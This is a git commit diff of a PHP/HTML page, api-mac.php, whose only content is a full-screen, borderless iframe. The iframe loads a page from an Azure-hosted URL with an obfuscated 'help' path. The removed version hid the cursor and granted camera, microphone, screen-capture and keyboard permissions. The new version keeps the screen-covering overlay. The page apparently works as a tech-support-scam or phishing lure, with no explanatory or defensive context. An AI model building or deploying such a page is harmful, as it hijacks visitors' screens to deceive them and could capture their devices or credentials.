8acf0e2aec7e91dd2993594882ef68ce274a44be
rosioleydicondori-create <rosioleydicondori@gmail.com>
2026-06-24 15:48:01 +0530

    Update api-mac.php

--- api-mac.php
+++ api-mac.php
@@ -2,29 +2,8 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title></title>
-<style>
-  iframe {
-    position: fixed;
-    width: 100%;
-    height: 100%;
-    border: none;
-    top: 0;
-    left: 0;
-  cursor: none;
-}
-</style>
-
 </head>
 <body>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
-
-<iframe 
-  id="f"
-  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
-  allowfullscreen 
-  webkitallowfullscreen 
-  mozallowfullscreen 
-  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *" >
-</iframe>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/><iframe src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" style="visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>
 </body>
 </html>
